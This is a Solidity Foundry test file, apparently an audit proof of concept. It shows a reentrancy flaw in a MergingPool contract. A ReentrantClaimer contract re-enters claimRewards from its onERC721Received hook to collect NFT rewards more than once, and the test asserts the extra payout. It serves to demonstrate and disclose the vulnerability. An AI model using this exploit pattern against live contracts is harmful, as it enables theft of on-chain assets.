// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {MergingPool} from "../../src/MergingPool.sol";

/// -------------------------------------------------------------------------
/// Minimal ERC721 implementation that exposes the two functions the
/// MergingPool contract interacts with: `ownerOf` and `mintFromMergingPool`.
/// It purposefully calls `_safeMint` inside `mintFromMergingPool` so that the
/// recipient contract's `onERC721Received` hook is executed, giving us a
/// re-entrancy opportunity.
/// -------------------------------------------------------------------------
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract FighterFarmMock is ERC721 {
    /// Address that is allowed to mint via `mintFromMergingPool`
    address public mergingPool;

    uint256 private _tokenIdCounter;

    constructor() ERC721("MockFighter", "MF") {}

    function setMergingPool(address _mp) external {
        mergingPool = _mp;
    }

    /*//////////////////////////////////////////////////////////////
                            Functions used by MergingPool
    //////////////////////////////////////////////////////////////*/

    // Called by MergingPool.pickWinner to resolve token ownership
    function ownerOf(uint256 tokenId) public view override returns (address) {
        return super.ownerOf(tokenId);
    }

    // Called by MergingPool.claimRewards – MUST trigger onERC721Received
    function mintFromMergingPool(
        address to,
        string calldata /*modelHash*/,
        string calldata /*modelType*/,
        uint256[2] calldata /*customAttributes*/
    ) external {
        require(msg.sender == mergingPool, "Not merging pool");
        _tokenIdCounter += 1;
        _safeMint(to, _tokenIdCounter);
    }

    /*//////////////////////////////////////////////////////////////
                            Test helpers
    //////////////////////////////////////////////////////////////*/
    // Helper that lets the test suite pre-mint existing NFTs so that
    // `ownerOf` returns a valid winner address.
    function mockMint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
        if (tokenId > _tokenIdCounter) {
            _tokenIdCounter = tokenId;
        }
    }
}

/// -------------------------------------------------------------------------
/// Re-entrant claimer contract. Implements `IERC721Receiver` so that it can
/// react to the `_safeMint` performed in `FighterFarmMock.mintFromMergingPool`.
/// Each time it receives an NFT it will attempt to re-enter
/// `MergingPool.claimRewards`, allowing it to collect extra rewards.
/// -------------------------------------------------------------------------
contract ReentrantClaimer is IERC721Receiver {
    MergingPool public immutable pool;
    uint256 public reenterDepth;

    constructor(MergingPool _pool) {
        pool = _pool;
    }

    /// External entry-point called by the test
    function attack() external {
        _claim();
    }

    /// Builds dummy arrays and calls `claimRewards` on the pool.
    function _claim() internal {
        // We know beforehand that there are 3 unclaimed rewards, so we pass
        // arrays of length 3 filled with arbitrary data – the pool contract
        // only cares about the *length* when indexing into them.
        string[] memory uris = new string[](3);
        string[] memory types_ = new string[](3);
        uint256[2][] memory attrs = new uint256[2][](3);
        for (uint256 i = 0; i < 3; i++) {
            uris[i] = "dummyURI";
            types_[i] = "dummyType";
            attrs[i] = [uint256(100), uint256(100)];
        }
        pool.claimRewards(uris, types_, attrs);
    }

    /// When the mock FighterFarm safely mints an NFT to this contract the
    /// function below is invoked, giving us a chance to immediately re-enter
    /// `claimRewards` before the first invocation has finished.
    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        // Re-enter at most two times so the exploit terminates.
        if (reenterDepth < 2) {
            reenterDepth += 1;
            _claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

/// -------------------------------------------------------------------------
/// Test case demonstrating the re-entrancy vulnerability.
/// -------------------------------------------------------------------------
contract ExploitTest is Test {
    FighterFarmMock internal farm;
    MergingPool internal pool;
    ReentrantClaimer internal attacker;

    /// Helper used as admin/owner when deploying `MergingPool`.
    address internal admin = address(this);

    function setUp() public {
        // Deploy mock fighter farm
        farm = new FighterFarmMock();

        // Deploy the vulnerable pool – note that `rankedBattleAddress` is
        // irrelevant for this PoC so we just pass a junk value.
        pool = new MergingPool(admin, address(0xdead), address(farm));

        // Register the pool inside the mock so `mintFromMergingPool` can be
        // called successfully.
        farm.setMergingPool(address(pool));

        // For simplicity we want one winner per round.
        pool.updateWinnersPerPeriod(1);

        // Deploy attacker contract that will exploit the pool.
        attacker = new ReentrantClaimer(pool);

        // ------------------------------------------------------------------
        // Prepare three finished rounds where the attacker is the sole winner
        // ------------------------------------------------------------------
        // Mint three existing NFTs so `ownerOf(tokenId)` resolves correctly.
        farm.mockMint(address(attacker), 1);
        farm.mockMint(address(attacker), 2);
        farm.mockMint(address(attacker), 3);

        uint256[] memory arr = new uint256[](1);

        // Round 0 winner (token-id 1)
        arr[0] = 1;
        pool.pickWinner(arr);
        // Round 1 winner (token-id 2)
        arr[0] = 2;
        pool.pickWinner(arr);
        // Round 2 winner (token-id 3)
        arr[0] = 3;
        pool.pickWinner(arr);
        // `roundId` is now 3, meaning the attacker legitimately has 3
        // unclaimed rewards.
    }

    /// The exploit succeeds when the attacker ends up with *six* additional
    /// NFTs instead of the expected three. This proves that the re-entrancy
    /// doubles the payout.
    function testReentrancyExploit() public {
        uint256 balanceBefore = farm.balanceOf(address(attacker));
        assertEq(balanceBefore, 3, "setup failure - attacker should own 3 NFTs");

        // Execute the attack – this will trigger the re-entrancy in the pool.
        attacker.attack();

        uint256 balanceAfter = farm.balanceOf(address(attacker));
        // Expect six new NFTs were minted instead of three, resulting in nine
        // total fighters for the attacker.
        assertEq(balanceAfter, 9, "exploit failed - incorrect number of NFTs");
    }
}
